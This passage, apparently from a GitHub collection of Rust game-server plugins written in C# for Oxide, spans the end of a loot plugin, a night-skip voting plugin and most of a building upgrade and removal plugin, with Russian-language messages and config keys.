            storedExportNames = Interface.GetMod().DataFileSystem.ReadObject<StoredExportNames>("BetterLoot\\NamesList");
            if (storedExportNames.AllItemsAvailable.Count == 0 || (int)storedExportNames.version != Rust.Protocol.network)
            {
                storedExportNames = new StoredExportNames();
                var exportItems = new List<ItemDefinition>(ItemManager.itemList);
                storedExportNames.version = Rust.Protocol.network;
                foreach (var it in exportItems)
                    storedExportNames.AllItemsAvailable.Add(it.shortname, it.displayName.english);
                Interface.GetMod().DataFileSystem.WriteObject("BetterLoot\\NamesList", storedExportNames);
                Puts($"Exported {storedExportNames.AllItemsAvailable.Count} items to 'NamesList'");
            }
        }

        [ChatCommand("blacklist")]
        void cmdChatBlacklist(BasePlayer player, string command, string[] args)
        {
            string usage = "Usage: /blacklist [additem|deleteitem] \"ITEMNAME\"";
            if (!initialized)
            {
                SendReply(player, string.Format("Plugin not enabled."));
                return;
            }
            if (args.Length == 0)
            {
                if (storedBlacklist.ItemList.Count == 0)
                {
                    SendReply(player, string.Format("There are no blacklisted items"));
                }
                else
                {
                    var sb = new StringBuilder();
                    foreach (var item in storedBlacklist.ItemList)
                    {
                        if (sb.Length > 0)
                            sb.Append(", ");
                        sb.Append(item);
                    }
                    SendReply(player, string.Format("Blacklisted items: {0}", sb.ToString()));
                }
                return;
            }
            if (!ServerUsers.Is(player.userID, ServerUsers.UserGroup.Owner))
            {
                //SendReply(player, string.Format(lang.GetMessage("msgNotAuthorized", this, player.UserIDString)));
                SendReply(player, "You are not authorized to use this command");
                return;
            }
            if (args.Length != 2)
            {
                SendReply(player, usage);
                return;
            }
            if (args[0] == "additem")
            {
                if (!ItemExists(args[1]))
                {
                    SendReply(player, string.Format("Not a valid item: {0}", args[1]));
                    return;
                }
                if (!storedBlacklist.ItemList.Contains(args[1]))
                {
                    storedBlacklist.ItemList.Add(args[1]);
                    UpdateInternals(false);
                    SendReply(player, string.Format("The item '{0}' is now blacklisted", args[1]));
                    SaveBlacklist();
                    return;
                }
                else
                {
                    SendReply(player, string.Format("The item '{0}' is already blacklisted", args[1]));
                    return;
                }
            }
            else if (args[0] == "deleteitem")
            {
                if (!ItemExists(args[1]))
                {
                    SendReply(player, string.Format("Not a valid item: {0}", args[1]));
                    return;
                }
                if (storedBlacklist.ItemList.Contains(args[1]))
                {
                    storedBlacklist.ItemList.Remove(args[1]);
                    UpdateInternals(false);
                    SendReply(player, string.Format("The item '{0}' is now no longer blacklisted", args[1]));
                    SaveBlacklist();
                    return;
                }
                else
                {
                    SendReply(player, string.Format("The item '{0}' is not blacklisted", args[1]));
                    return;
                }
            }
            else
            {
                SendReply(player, usage);
                return;
            }
        }

        #region Hammer loot cycle

        object OnMeleeAttack(BasePlayer player, HitInfo c)
        {
            //Puts($"OnMeleeAttack works! You hit {c.HitEntity.PrefabName}"); DEBUG FOR TESTING
            var item = player.GetActiveItem();
            if (item.hasCondition) return null;
            //Puts($"{item.ToString()}");
            if (!player.IsAdmin || c.HitEntity.GetComponent<LootContainer>() == null || !item.ToString().Contains("hammer") || !enableHammerLootCycle)  return null;
            var inv = c.HitEntity.GetComponent<StorageContainer>();
            inv.gameObject.AddComponent<HammerHitLootCycle>();
            player.inventory.loot.StartLootingEntity(inv, false);
            player.inventory.loot.AddContainer(inv.inventory);
            player.inventory.loot.SendImmediate();
            player.ClientRPCPlayer(null, player, "RPC_OpenLootPanel", inv.panelName);

            //Timer s = timer.Every(1f, () => { PopulateContainer(inv})
            return null;
            }

        class HammerHitLootCycle : FacepunchBehaviour
        {
            void Awake()
            {
                if (!bl.initialized) return;
                InvokeRepeating(Repeater, (float)bl.hammerLootCycleTime, (float)bl.hammerLootCycleTime);
            }
            void Repeater()
            {
                if (!enabled) return;
                LootContainer loot = GetComponent<LootContainer>();
                bl.Puts($"{loot}");
                bl.PopulateContainer(loot);
            }
            private void PlayerStoppedLooting(BasePlayer player)
            {
                //bl.Puts($"Ended looting of the box"); Doesn't call but it works for a reason I don't quite understand
                CancelInvoke(Repeater);
                Destroy(this);
            }
        }

        #endregion
    }
}


// --- End of file: BetterLoot.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HudRust/SkipNight.cs ---
// --- Original Local Path: HudRust/SkipNight.cs ---

using Oxide.Core;
using UnityEngine;
using System.Linq;
using Oxide.Game.Rust.Cui;
using Newtonsoft.Json;
using Oxide.Core.Plugins;
using System.Collections.Generic;

namespace Oxide.Plugins
{
    [Info("SkipNight", "walkinrey", "1.0.4")]
    class SkipNight : RustPlugin
    {
      #region Configuration
      class Configuration
      {
        [JsonProperty(PropertyName = "Сколько секунд будет длиться голосование (по умолчанию 60)")]
        public float VoteTime = 60f;
        [JsonProperty(PropertyName = "Сообщение при пропуске ночи")]
        public string SkipNightString = "Голосование окончено. Большинство проголосовало за пропуск ночи.";
        [JsonProperty(PropertyName = "Сообщение против пропуска ночи")]
        public string DisskipNightString = "Голосование окончено. Большинство проголосовало против пропуска ночи, оставляем текущее время суток.";
        [JsonProperty(PropertyName = "Какое время устанавливать при пропуске ночи (по умолчанию 12)")]
        public float TimeSet = 12f;
        [JsonProperty(PropertyName = "Раз в сколько секунд проверять текущее время на сервере? (влияет на производительность сервера)")]
        public float CheckTime = 5f;
        [JsonProperty(PropertyName = "Во сколько начинать голосование по игровому времени? (по умолчанию 18)")]
        public float VoteGameTime = 18f;
        [JsonProperty(PropertyName = "Какие дни будут пропускаться")]
        public int[] daysDisable = {1, 5, 12, 18, 24};
      }
      protected override void LoadDefaultConfig() => config = new Configuration();
      protected override void LoadConfig()
      {
            base.LoadConfig();
            try
            {
                config = Config.ReadObject<Configuration>();
                if (config == null) LoadDefaultConfig();
            }
            catch
            {
                LoadDefaultConfig();
            }
            Config.WriteObject(config, true);
      }
      #endregion
      #region References
      private Configuration config;
      private int AgreeVoted;
      private int DisagreeVoted;
      private bool VoteActive;
      private bool DisagreeActive;
      private List<BasePlayer> PlayersVoted = new List<BasePlayer>();
      [PluginReference] private Plugin ImageLibrary;
      #endregion
      #region Methods
      private void OnServerInitialized(bool initial) 
      {
         StartTimer();
      }
      [ChatCommand("disagreevote")]
      private void DisagreeVote(BasePlayer player)
      {
        if(PlayersVoted.Contains(player))
        {
          SendReply(player, "Вы уже голосовали раннее!");
        }
        else
        {
          if(VoteActive == true)
          {
                DestroyGUI(player);
                DisagreeVoted += 1;
                PlayersVoted.Add(player);
          }
        else
          {
            SendReply(player, "В данный момент не проходит голосование.");
          }   
        }
      }
      [ChatCommand("agreevote")]
      private void AgreeVote(BasePlayer player)
      {
        if(PlayersVoted.Contains(player))
        {
          SendReply(player, "Вы уже голосовали раннее!");
        }
        else
        {
                 if(VoteActive == true)
        {
        DestroyGUI(player);
        AgreeVoted += 1;
        PlayersVoted.Add(player);
        }
        else
        {
            SendReply(player, "В данный момент не проходит голосование.");
        }   
        }
      }
      private void VoteTimer()
      {
        float seconds = config.VoteTime;
        timer.Once(seconds, () =>
        {
           if(AgreeVoted > DisagreeVoted)
           {
             PrintToChat(config.SkipNightString);
             covalence.Server.Command("env.time " + config.TimeSet);
             SetDay();
             DestroyGUIAll();
           }
           else
           {
               PrintToChat(config.DisskipNightString);
               DestroyGUIAll();
               DisagreeActive = true;
           }
           VoteActive = false;
           AgreeVoted = 0;
           PlayersVoted = new List<BasePlayer>();
           DisagreeVoted = 0;
        });
      }
      private void SetDay()
      {
        int day = (TOD_Sky.Instance.Cycle.Day) + 1;
        if(day > 30) day = 1;
        TOD_Sky.Instance.Cycle.Day = day;
      }
      private float GetCurrentTime()
      {
        float time = TOD_Sky.Instance.Cycle.Hour;
        return time;
      }
      private bool IsDayCheck()
      {
         float time = GetCurrentTime();
         if(time < 18) return true;
         else return false;
      }
      private void StartTimer()
      {
        VoteActive = false;
         timer.Every(config.CheckTime, () =>
         {
           if(VoteActive == false)
           {
             float currentTime = GetCurrentTime();
             bool isDay = IsDayCheck();
             if(DisagreeActive == true && isDay == true) DisagreeActive = false;
             if(currentTime > config.VoteGameTime && DisagreeActive == false) CreateVoteGUI();
           }
         });
      }
      #region Hooks
      private void Loaded()
      {
        if(ImageLibrary == null)
        {
           PrintError("ОТКЛЮЧЕНИЕ ПЛАГИНА. У вас не установлен ImageLibrary!");
           Interface.Oxide.UnloadPlugin(Title);
           return;
        }
        ImageLibrary.CallHook("AddImage", "https://i.imgur.com/XPBv6WR.png", "SkipNightUI");
         LoadConfig();
      }
      private void Unload()
      {
        DestroyGUIAll();
        PlayersVoted = new List<BasePlayer>();
        AgreeVoted = 0;
        DisagreeVoted = 0;
      }
      #endregion
      #endregion
        #region GUI
        private void DestroyGUI(BasePlayer player)
        {
          CuiHelper.DestroyUi(player, "ButtonNo");
          CuiHelper.DestroyUi(player, "ImageVote");
          CuiHelper.DestroyUi(player, "ButtonYes");
        }
        private void DestroyGUIAll()
        {
           var activePlayerList = BasePlayer.activePlayerList.ToArray().ToList();
           foreach(var players in activePlayerList)
           {
          CuiHelper.DestroyUi(players, "ButtonNo");
          CuiHelper.DestroyUi(players, "ImageVote");
          CuiHelper.DestroyUi(players, "ButtonYes");
           }
        }
        private void CreateVoteGUI()
        {
          bool isSkipDay = false;
          for(int i = 0; i < config.daysDisable.Length; i++)
          {
            if(TOD_Sky.Instance.Cycle.Day == config.daysDisable[i]) {isSkipDay = true; break;}
          }
          if(isSkipDay == true) return;
          VoteTimer();
          VoteActive = true;
           var elements = CreateObjects();
           var activePlayerList = BasePlayer.activePlayerList.ToArray().ToList();
           foreach(var players in activePlayerList)
           {
              CuiHelper.AddUi(players, elements);
           }
        }
        private CuiElementContainer CreateObjects()
        {
          var elements = new CuiElementContainer();
          elements.Add(new CuiElement
            {
              Name = "ImageVote",
              Parent = "Overlay",
                Components =
                {       
                    new CuiRawImageComponent
                    {
                        Png = (string)ImageLibrary.CallHook("GetImage", "SkipNightUI")
                    },
                    new CuiRectTransformComponent
                    {
                        AnchorMin = "0 0.051",
                        AnchorMax = "0.281 0.19"
                    }
                }
            });
          var ButtonNo = elements.Add(new CuiButton
          {
            Button =
            {
              Close = "",
              Color = "0.31 0.31 0.31 0",
              Command = "chat.say /disagreevote"
            },
            RectTransform = 
            {
              AnchorMin = "0.091 0.076",
              AnchorMax = "0.159 0.115"
            },
            Text =
            {
              Text = "",
              FontSize = 11,
              Align = TextAnchor.MiddleCenter
            }
          }, "Overlay", "ButtonNo");
          var ButtonYes = elements.Add(new CuiButton
          {
            Button =
            {
              Close = "",
              Color = "0.31 0.31 0.31 0",
              Command = "chat.say /agreevote"
            },
            RectTransform = 
            {
              AnchorMin = "0.011 0.079",
              AnchorMax = "0.077 0.115"
            },
            Text =
            {
              Text = "",
              FontSize = 11,
              Align = TextAnchor.MiddleCenter
            }
          }, "Overlay", "ButtonYes");
          return elements;
        }
        #endregion
    }
}

// --- End of file: SkipNight.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HudRust/DVBuildingUpgrade.cs ---
// --- Original Local Path: HudRust/DVBuildingUpgrade.cs ---

﻿using System;
using System.Collections.Generic;
using System.Globalization;
using Newtonsoft.Json;
using Oxide.Core;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("DVBuildingUpgrade", "ClayMond", "2.0.3")]
    public class DVBuildingUpgrade : RustPlugin
    {
        #region Classes
        private class CurrentGrade
        { 
            [JsonProperty("Текущий индекс улучшения")]
            public int Grade;
            [JsonProperty("Время до де-активации")]
            public int DeActivateTime = 40;

            [JsonProperty("Таймер обновления")]
            public Timer DeTimer;

            public void UpdateTime(BasePlayer player, int time)
            {
                DeActivateTime = time;
                DeTimer?.Destroy();
                instance.UpdateTimer(player);
            }
            
            public void UpGrade(BasePlayer player, int time)
            {
				if (player==null) return;
                if (Grade >= 0 && Grade < 4)
                {
                    UpdateTime(player, time);
                    Activate(player, Grade + 1, CONF_RemoveDefaultTime);
                }
                else if (Grade >= 4)
                {
                    DeActivate(player);
                }
                else 
                {
                    player.ChatMessage($"Неизвестная ошибка. Сообщите адмнистрации: <color=#F24525>{Grade}</color>");
                    return;
                }
            }

            public void Activate(BasePlayer player, int grade, int time)
            {
				if (player==null) return;
                if (grade != Grade)
                { 
                    player.ChatMessage($"");
                }
                
                Grade = grade;
                DeActivateTime = time;

                if (Grade > 0)
                {
                    CuiHelper.DestroyUi(player, instance.Layer);
                    
                    var container = new CuiElementContainer();

                    var image = grade < 5 ? "UpImage" : "RemoveImage";

                    container.Add(new CuiElement
                    {
                        Name = instance.Layer,
                        Parent = "Hud",
                        Components =
                        {   
                            new CuiRawImageComponent { Png = (string) instance.ImageLibrary.Call("GetImage", image), Color = HexToRustFormat("#F65050") },
                            new CuiRectTransformComponent {AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-184.3 673.95", OffsetMax = "-143 713.9"}
                        }
                    });

                    CuiHelper.AddUi(player, container);
                }
                else
                {
                    CuiHelper.DestroyUi(player, instance.Layer);
                }

                instance.UpdateTimer(player);
            }

            public void DeActivate(BasePlayer player) 
            {
				if (player==null) return;
                player.ChatMessage($"");
                Grade = 0;
                Activate(player, 0, 0);
            } 
            
        }

        #endregion
 
        #region Variables

        #region Config

        #region Remove

        private const float RefundPercent = 0.5f;
        private static string CONF_RemovePermission = "GradeDestroy.Remove";
        private static bool CONF_RemoveActivated = true;
        private static int CONF_RemoveTime = 14400;
        private static int CONF_RemoveDefaultTime = 40;
        private static int CONF_RemoveHitTime = 5;
        private static bool CONF_RemoveGameFriends = false;
        private static bool CONF_RemoveFriends;
        private static bool CONF_RemoveClans;
        private static bool CONF_RemoveByCup;
        private static bool CONF_BlockRemoveOnRaid = true;

        #endregion

        #region Upgrade

        private static bool CONF_UpActivated = true;
        private static string CONF_UpPermission = "GradeDestroy.Up";
        private static bool CONF_BlockUpgradeOnRaid = true;
        private static bool CONF_EnableOnHit;

        #endregion

        #region Other
        [PluginReference] Plugin ImageLibrary;
        
        private static List<string> CONF_GradeNames = new List<string>
        {
            "отключено",
            "дерево",
            "камень",
            "металл",
            "мвк",
            "ремув"
        };
        
        public static Dictionary<string, ItemBlueprint> DeployableToBlueprint = new Dictionary<string, ItemBlueprint>();

        #endregion
        
        #endregion

        #region System
        
        [PluginReference] private Plugin Friends, Clans, NoEscape;
        private string Layer = "UI.Remove";
        private static DVBuildingUpgrade instance;

        // Список объектов с кулдаунами до удаления
        Dictionary<uint, double> removeTimers = new Dictionary<uint, double>();
        // Информация об игроках
        private Dictionary<ulong, CurrentGrade> playerGrades = new Dictionary<ulong,CurrentGrade>();

        #endregion

        #endregion
 
        #region Initialization
          
        private void OnServerInitialized()
        {
            instance = this;
            LoadDefaultConfig();

            if (Interface.Oxide.DataFileSystem.ExistsDatafile("Temporary/DVBuildingUpgrade/Objects"))
            {
                removeTimers = Interface.Oxide.DataFileSystem.ReadObject<Dictionary<uint, double>>("Temporary/DVBuildingUpgrade/Objects");
            }
            
            timer.Every(325, SaveData);
            
            foreach (var item in ItemManager.itemList)
            {
                var itemDep = item.GetComponent<ItemModDeployable>();
                var itemBlueprint = item.GetComponent<ItemBlueprint>();
                if (itemDep != null && itemBlueprint != null)
                {
                    DeployableToBlueprint[itemDep.entityPrefab.resourcePath] = itemBlueprint;
                }
            }
			
			if (ImageLibrary){        
			
				ImageLibrary.Call("AddImage", "https://i.imgur.com/7Ay2thv.png", "RemoveImage");
				ImageLibrary.Call("AddImage", "https://i.imgur.com/QoT9u4b.png", "UpImage");
			}
        }

        private void Unload()
        {
            SaveData();
            foreach (var p in BasePlayer.activePlayerList) CuiHelper.DestroyUi(p, Layer);
        }

        private void SaveData()
        {
            Interface.Oxide.DataFileSystem.WriteObject("Temporary/DVBuildingUpgrade/Objects", removeTimers);
        }
        
        protected override void LoadDefaultConfig()
        {
            GetConfig("Удаление построек", "Разрешать игрокам удалять постройки", ref CONF_RemoveActivated);
            GetConfig("Удаление построек", "Разрешение для удаления построек", ref CONF_RemovePermission);
            GetConfig("Удаление построек", "Лимит времени для удаления (0 - бесконечно)", ref CONF_RemoveTime);
            GetConfig("Удаление построек", "Разрешить удалять постройки друзей", ref CONF_RemoveFriends);
            GetConfig("Удаление построек", "Разрешить удалять постройка со-кланов", ref CONF_RemoveClans);
            GetConfig("Удаление построек", "Разрешить удалять при авторизации в шкафу", ref CONF_RemoveByCup);
            GetConfig("Удаление построек", "Запрещать удалять во время рейда", ref CONF_BlockRemoveOnRaid);
            
            GetConfig("Улучшение построек", "Разрешать игрокам улучшать постройки", ref CONF_UpActivated);
            GetConfig("Улучшение построек", "Разрешение для улучшения построек", ref CONF_UpPermission);
            GetConfig("Улучшение построек", "Время автоматического включения улучшения", ref CONF_RemoveHitTime);
            GetConfig("Улучшение построек", "Включать режим автоматического улучшения при ручном улучшения", ref CONF_EnableOnHit);
            GetConfig("Улучшение построек", "Запрещать улучшать во время рейда", ref CONF_BlockUpgradeOnRaid);
            

            GetConfig("Остальное", "Отображение имён улучшения", ref CONF_GradeNames);
            
            Config.Save();
        }

        #endregion

        #region Functions

        private string CanRemove(BasePlayer player, BaseEntity entity)
        {
			if (player==null || entity==null) return "Ошибка";
            if (!player.IsBuildingAuthed())
            { 
                return "Вы не можете удалять постройки без шкафа</color>"; 
            }
             
            if (!player.CanBuild())
            {
                return "Вы не можете удалять в зоне действия<color=#F24525>чужого шкафа</color>!"; 
            }

            var time = GetRaidBlockTime(player.userID);
             
            if (time > 0)
            {
                return $"Вы не можете улучшать постройки! Подождите: {FormatTime(TimeSpan.FromSeconds(time))}</color>";
            }

            double maxRemoveTime;
            if (CONF_RemoveTime != 0 && removeTimers.TryGetValue(entity.net.ID, out maxRemoveTime) && maxRemoveTime <= CurrTimestamp())
            { 
                return "Вышло время удаления данного объекта!</color>";
            }

            bool isOwner = entity.OwnerID == player.userID;
            bool areFriends = (bool) (Friends?.Call("ApiIsFriend", player.userID, entity.OwnerID) ?? false);
            List<string> areClanMates = (List<string>) (Clans?.Call("GetClanMembers", player.userID) ?? new List<string>());
            
            if (CONF_RemoveByCup || CONF_RemoveFriends && areFriends || CONF_RemoveClans && areClanMates.Contains(entity.OwnerID.ToString()) || isOwner)
            {
                return "";
            }

            return "Вы можете удалять свои постройки, а также постройки друзей!</color>";
        }

        private string TryUpgrade(BasePlayer player, BuildingBlock block, CurrentGrade currentGrade)
        {
			if (player==null || block==null) return "Ошибка";
            if (currentGrade.Grade <= (int) block.lastGrade )
                return "";

            var time = GetRaidBlockTime(player.userID);
            
            if (time > 0)
            {
                return $"Вы не можете улучшать постройки! Подождите: {FormatTime(TimeSpan.FromSeconds(time))}</color>";
            }

            var building = BuildingManager.server.GetBuilding(block.buildingID);
            if (building != null && !building.HasBuildingPrivileges())
            {
                return $"Вы не можете использовать автоапгрейд <color=#F24525>без шкафа</color>.</color>";
            }

            if (CONF_BlockUpgradeOnRaid && NoEscape)
            {
                var blockTime = (bool) (NoEscape?.Call("IsRaidBlocked", player) ?? false);
                if (blockTime)
                {
                    currentGrade.DeActivate(player); 
                    return "Вы не можете авто-улучшать постройки во время рейда</color>!";
                }
            }
            
            if (block.SecondsSinceAttacked < 30)
            { 
                return $"Это объект можно будет улучшить через {FormatTime(TimeSpan.FromSeconds(30 - (int) block.SecondsSinceAttacked), maxSubstr:2)}</color>";
            }

            if (block.blockDefinition.checkVolumeOnUpgrade &&
                DeployVolume.Check(block.transform.position, block.transform.rotation, 
                    PrefabAttribute.server.FindAll<DeployVolume>(block.prefabID), ~(1 << block.gameObject.layer)))
            {
                return $"Улучшение данного объекта чем-то заблокированно</color>";
            }

            
            foreach (var check in block.blockDefinition.grades[currentGrade.Grade].costToBuild)
            {
                if (player.inventory.GetAmount(check.itemid) < check.amount)
                {
                    CuiHelper.DestroyUi(player, Layer);
                    currentGrade.DeActivate(player);
                    return "У вас не хватает ресурсов для автоматического улучшения!</color>";
                }
            }
            
            foreach (var check in block.blockDefinition.grades[currentGrade.Grade].costToBuild)
            {
                player.inventory.Take(null, check.itemid, (int) check.amount);
                player.Command("note.inv", check.itemid, check.amount * -1f);
            }
            
            block.SetGrade((BuildingGrade.Enum) currentGrade.Grade);
            block.UpdateSkin(); 
            block.SetHealthToMax();
            block.SendNetworkUpdate(BasePlayer.NetworkQueue.Update);
            currentGrade.UpdateTime(player, CONF_RemoveDefaultTime);
            
            return "";
        }

        private void UpdateTimer(BasePlayer player)
        {
            CurrentGrade currentGrade = GetPlayerCurrentGrade(player);
            if (currentGrade.Grade == 0)
            {
                CuiHelper.DestroyUi(player, Layer);
                return;
            }
            
            CuiHelper.DestroyUi(player, Layer + ".Text");
            
            CuiElementContainer container = new CuiElementContainer();
            
            container.Add(new CuiLabel
            {
                Text = { Text = $"{CONF_GradeNames[currentGrade.Grade].ToUpper()}", FontSize = 9, Font = "robotocondensed-regular.ttf", Align = TextAnchor.MiddleCenter },
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMin = "0 20.7" }
            }, Layer, Layer + ".Text");

            CuiHelper.AddUi(player, container);
              
            currentGrade.DeActivateTime--;
            if (currentGrade.DeActivateTime < 0)
            { 
                currentGrade.DeActivate(player);
                CuiHelper.DestroyUi(player, Layer);
                return;
            }
            
            currentGrade.DeTimer?.Destroy();
            currentGrade.DeTimer = timer.Once(1, () => UpdateTimer(player));
        }

        #endregion

        #region Commands

        [ConsoleCommand("building.upgrade")]
        void cmdConsoleUpgrade(ConsoleSystem.Arg arg)
        {
            var player = arg.Connection?.player as BasePlayer;

            if (player == null) return;

            CurrentGrade currentGrade = GetPlayerCurrentGrade(player);
            currentGrade.UpGrade(player, CONF_RemoveDefaultTime); 
        }
        
        [ChatCommand("remove")]
        private void cmdChatRemove(BasePlayer player, string command, string[] args)
        {
            if (player == null) return;
            if (!CONF_RemoveActivated)
                return;
            
            CurrentGrade currentGrade = GetPlayerCurrentGrade(player);

            if (currentGrade.Grade == 5)
            {
                currentGrade.DeActivate(player);
            }
            else
            {
                currentGrade.Activate(player, 5, CONF_RemoveDefaultTime);
            }
        }

        [ChatCommand("up")]
        private void cmdChatUpgrade(BasePlayer player, string command, string[] args)
        {
            if (player == null) return;
            if (!CONF_UpActivated)
                return;

            CurrentGrade currentGrade = GetPlayerCurrentGrade(player);

            switch (args.Length)
            {
                case 0:
                {
                    currentGrade.UpGrade(player, CONF_RemoveDefaultTime);
                    break;
                }
                case 1:
                {
                    int newGrade;
                    if (!int.TryParse(args[0], out newGrade) || newGrade < 0 || newGrade > 4)
                    {
                        SendReply(player, $"Введенный уровень улучшение <color=#D500C3>не существует</color>!\n" +
                                                $"Попробуйте:\n" +
                                                $"\n" + 
                                                $"0</color> => Отключить\n" +
                                                $"1</color> => дерево\n" +
                                                $"2</color> => камень\n" +
                                                $"3</color> => металл\n" +
                                                $"4</color> => мвк");
                        return;
                    }
                    currentGrade.Activate(player, newGrade, CONF_RemoveDefaultTime);
                    break;
                }
                default:
                {
                    cmdChatUpgrade(player, command, new string[] { });
                    return;
                }
            }
        }

        #endregion

        #region Hooks

        private void OnEntityBuilt(Planner plan, GameObject go)
        {
            if (plan == null) return;
            BasePlayer player = plan?.GetOwnerPlayer();
            if (player == null)
                return;

            var baseEnt = go.ToBaseEntity();
            BuildingBlock block = go.ToBaseEntity().GetComponent<BuildingBlock>();

            if (CONF_RemoveTime != 0 && (block != null || baseEnt is Door))
            {
                removeTimers.Add(baseEnt.net.ID, CurrTimestamp() + CONF_RemoveTime);
            }
            
            if (block == null) 
                return;

            var currentGrade = GetPlayerCurrentGrade(player);
            if (currentGrade.Grade <= 0 || currentGrade.Grade > 4)
                return;

            var result = TryUpgrade(player, block, currentGrade);
            if (result != string.Empty)
            {
                player.ChatMessage(result);
            }
        }
        
        object OnHammerHit(BasePlayer player, HitInfo info)
        {
            if (info == null)
                return null;
            
            var currentGrade = GetPlayerCurrentGrade(player);

            var ent = info.HitEntity;
            if (ent == null)
                return null;
            
            if (currentGrade.Grade == 5)
            {
                if ((ent is BuildingBlock || DeployableToBlueprint.ContainsKey(ent.PrefabName)) && !ent.IsDestroyed)
                {
                    var tryRemoveResult = CanRemove(player, ent);
                    if (tryRemoveResult != "")
                        SendReply(player, tryRemoveResult);
                    else
                        RemoveEntity(player, ent);
                    return false;
                }
            }
            else if (currentGrade.Grade != 0)
            {
                var block = ent as BuildingBlock;
                if (block != null && HasUpgradePrivilege(player, block))
                {
                    var tryUpgradeResult = TryUpgrade(player, block, currentGrade);
                    if (tryUpgradeResult != string.Empty)
                        SendReply(player, tryUpgradeResult);
                    return false;
                }
            }
            else
            {
                if (CanRemove(player, ent) == string.Empty)
                {
                    var block = ent as BuildingBlock;
                    if (block != null && HasUpgradePrivilege(player, block))
                    {
                        double maxRemoveTime;
                        if (removeTimers.TryGetValue(block.net.ID, out maxRemoveTime) && player.SecondsSinceAttacked > 10) 
                        {
                            double leftRemove = maxRemoveTime - CurrTimestamp();
                            if (leftRemove < 0) 
                            {
                                SendReply(player, "Время удаления данного объекта<color=#D500C3>закончилось</color>!");
                            }
                            else
                            {
                                SendReply(player, $"Через<color=#F24525>{FormatTime(TimeSpan.FromSeconds(leftRemove), maxSubstr:2)}</color> вы не сможете удалить этот объект!");
                            }
                            
                            player.Hurt(0);
                        }
                    }
                }
            }
            
            return null;
        }

        private bool HasUpgradePrivilege(BasePlayer player, BaseEntity entity)
        {
            return !player.IsBuildingBlocked(entity.transform.position, entity.transform.rotation, entity.bounds);
        }

        object OnStructureUpgrade(BaseCombatEntity entity, BasePlayer player, BuildingGrade.Enum grade)
        {
			if (player==null) return null;
            if (CONF_EnableOnHit && permission.UserHasPermission(player.UserIDString, CONF_UpPermission))
            {
                CurrentGrade currentGrade = GetPlayerCurrentGrade(player);
                currentGrade.Activate(player, (int) grade, CONF_RemoveHitTime);
            }

            if (player.SecondsSinceAttacked > 10)
            { 
                SendReply(player, $"Вы можете удалить построенный объект в течении <color=#F24525>{FormatTime(TimeSpan.FromSeconds(CONF_RemoveTime), maxSubstr:2)}</color>");
                player.Hurt(0);
            }
            return null;
        }

        #endregion

        #region Utils
        
        private void RemoveEntity(BasePlayer player, BaseEntity hitEntity)
        {
			if (player==null || hitEntity==null) return;
            RefundEntity(player, hitEntity);
            
            var storageContainer = hitEntity as StorageContainer;
            if (storageContainer != null)
            {
                storageContainer.DropItems();
            }

            removeTimers.Remove(hitEntity.net.ID);
            hitEntity.Kill(BaseNetworkable.DestroyMode.Gib);
        }

        private static void RefundEntity(BasePlayer player, BaseEntity entity)
        {
			if (player==null || entity==null) return;
            if (entity.name == "assets/prefabs/deployable/planters/planter.small.deployed.prefab")
            {
                return;
            }

            List<ItemAmount> ingredientList = null;

            var entityBb = entity as BuildingBlock;
            ItemBlueprint itemBp;
            if (DeployableToBlueprint.TryGetValue(entity.name, out itemBp))
            {
                ingredientList = itemBp.ingredients;
            }
            else if (entityBb != null)
            {
                ingredientList = entityBb.blockDefinition.grades[(int) entityBb.grade].costToBuild;
            }

            if (ingredientList == null || ingredientList.Count == 0)
            {
                return;
            }
            
            foreach (ItemAmount ingredient in ingredientList)
            {
                var amount = (int)ingredient.amount;
                amount = amount == 0 ? 1 : amount;
                amount = (int) Math.Round( (double) amount * RefundPercent);

                if (amount <= 0)
                {
                    continue;
                }

                Item item = ItemManager.CreateByItemID(ingredient.itemid, amount);
                player.GiveItem(item);
            }
        }
        
        private CurrentGrade GetPlayerCurrentGrade(BasePlayer player)
        {
            CurrentGrade currentGrade;
            if (!playerGrades.TryGetValue(player.userID, out currentGrade))
                currentGrade = playerGrades[player.userID] = new CurrentGrade();
            return currentGrade;
        }

        public double GetRaidBlockTime(ulong userID)
        {
            if (!plugins.Find("NoEscape")) return 0;
            var time = plugins.Find("NoEscape").CallHook("ApiGetTime", userID);
            return Convert.ToDouble(time);
        }

        private static string HexToRustFormat(string hex)
        {
            if (string.IsNullOrEmpty(hex))
            {
                hex = "#FFFFFFFF";
            }

            var str = hex.Trim('#');

            if (str.Length == 6)
                str += "FF";

            if (str.Length != 8)
            {
                throw new Exception(hex);
            }

            var r = byte.Parse(str.Substring(0, 2), NumberStyles.HexNumber);
            var g = byte.Parse(str.Substring(2, 2), NumberStyles.HexNumber);
            var b = byte.Parse(str.Substring(4, 2), NumberStyles.HexNumber);
            var a = byte.Parse(str.Substring(6, 2), NumberStyles.HexNumber);

            Color color = new Color32(r, g, b, a);

            return $"{color.r:F2} {color.g:F2} {color.b:F2} {color.a:F2}";
        }
        
        public static string FormatTime(TimeSpan time, int maxSubstr = 5)
        {
            string result = string.Empty;

            int i = 0;
            if (time.Days != 0 && i < maxSubstr)
            {
                if (!string.IsNullOrEmpty(result))
                    result += " ";

                result += $"{Format(time.Days, "дней", "дня", "день")}";
                i++;
            }

            if (time.Hours != 0 && i < maxSubstr)
            {
                if (!string.IsNullOrEmpty(result))
                    result += " ";

                result += $"{Format(time.Hours, "часов", "часа", "час")}";
                i++;
            }

            if (time.Minutes != 0 && i < maxSubstr)
            {
                if (!string.IsNullOrEmpty(result))
                    result += " ";

                result += $"{Format(time.Minutes, "минут", "минуты", "минута")}";
                i++;
            }

            if (time.Seconds != 0 && i < maxSubstr)
            {
                if (!string.IsNullOrEmpty(result))
                    result += " ";

                result += $"{Format(time.Seconds, "секунд", "секунды", "секунда")}";
            }

            return result;
        }
        
        private static string Format(int units, string form1, string form2, string form3 )
        {
            var tmp = units % 10;

            if (units >= 5 && units <= 20 || tmp >= 5 && tmp <= 9)
                return $"{units} {form1}";

            if (tmp >= 2 && tmp <= 4)
                return $"{units} {form2}";

            return $"{units} {form3}";
        }
        
        private bool GetConfig<T>(string mainMenu, string key, ref T var)
        {
            if (Config[mainMenu, key] != null)
            {
